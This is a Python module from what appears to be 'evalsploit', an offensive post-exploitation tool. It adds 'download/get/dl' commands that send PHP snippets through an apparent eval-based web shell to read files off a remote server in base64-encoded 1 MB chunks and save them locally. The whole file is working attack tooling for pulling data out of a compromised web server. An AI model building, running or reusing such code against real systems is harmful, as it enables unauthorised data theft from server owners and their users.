from __future__ import annotations

import sys
from base64 import b64decode
from pathlib import Path
from typing import TYPE_CHECKING, Optional

from evalsploit.config import project_root
from evalsploit.modules.base import load_snippet, substitute, php_quote
from evalsploit.modules.registry import register
from evalsploit.modules.base import Module

if TYPE_CHECKING:
    from evalsploit.context import SessionContext

_CHUNK_SIZE = 1024 * 1024  # 1 MB per request


def _fmt_size(n: int) -> str:
    if n < 1024:
        return f"{n} B"
    if n < 1024 * 1024:
        return f"{n / 1024:.1f} KB"
    return f"{n / (1024 * 1024):.1f} MB"


def _resolve_dest(remote_path: str, local_arg: str) -> Path:
    name = Path(remote_path).name
    if local_arg:
        local_path = Path(local_arg)
        if local_path.exists() and local_path.is_dir():
            return local_path / name
        local_path.parent.mkdir(parents=True, exist_ok=True)
        return local_path
    downloads_dir = project_root() / "data" / "downloads"
    downloads_dir.mkdir(parents=True, exist_ok=True)
    return downloads_dir / name


def _download_chunked(ctx: "SessionContext", snip: str, remote_path: str, dest: Path) -> bool:
    """Multi-request chunked download. Returns True on success."""
    # Info request: offset=0, length=0 → SIZE:<n>
    php_info = substitute(snip, {
        "$_LOCAL": php_quote(remote_path),
        "$_OFFSET": "0",
        "$_LENGTH": "0",
    })
    size_resp = ctx.send(php_info).strip()
    if size_resp.startswith("ERR:"):
        print(f"Download failed: {size_resp[4:]}")
        return False
    if not size_resp.startswith("SIZE:"):
        print(f"Unexpected response: {size_resp!r}")
        return False
    total = int(size_resp[5:])

    data = bytearray()
    offset = 0
    while offset < total:
        length = min(_CHUNK_SIZE, total - offset)
        php = substitute(snip, {
            "$_LOCAL": php_quote(remote_path),
            "$_OFFSET": str(offset),
            "$_LENGTH": str(length),
        })
        chunk_resp = ctx.send(php).strip()
        if chunk_resp.startswith("ERR:"):
            print(f"\nDownload failed: {chunk_resp[4:]}")
            return False
        chunk = b64decode(chunk_resp)
        data.extend(chunk)
        offset += len(chunk)
        pct = offset * 100 // total if total else 100
        sys.stdout.write(f"\r  {_fmt_size(offset)} / {_fmt_size(total)} ({pct}%)  ")
        sys.stdout.flush()

    sys.stdout.write("\n")
    dest.write_bytes(bytes(data))
    return True


@register("download", description="Download file from server", usage="download <remote> [ : <local>]")
class DlModule(Module):
    def run(self, ctx: "SessionContext", args: str) -> Optional[str]:
        if not args.strip():
            return None
        parts = [p.strip() for p in args.split(":", 1)]
        remote_path = ctx.resolve_path(parts[0])
        if not ctx.file_exists(remote_path):
            print("File does not exist")
            return None
        snip = load_snippet(ctx.config.snippet_dl or "dl", "dl")
        if not snip:
            return "Snippet not found"
        dest = _resolve_dest(remote_path, parts[1] if len(parts) > 1 else "")

        if "$_OFFSET" in snip:
            ok = _download_chunked(ctx, snip, remote_path, dest)
            if ok:
                print(f"Saved to {dest}")
        else:
            php = substitute(snip, {"$_LOCAL": php_quote(remote_path)})
            out = ctx.send(php)
            if out.strip() in ("X", "0"):
                print("Download failed")
                return None
            try:
                dest.write_bytes(b64decode(out))
                print(f"Saved to {dest}")
            except Exception as e:
                print(f"Error saving: {e}")
        return None


register("get")(DlModule)
register("dl")(DlModule)
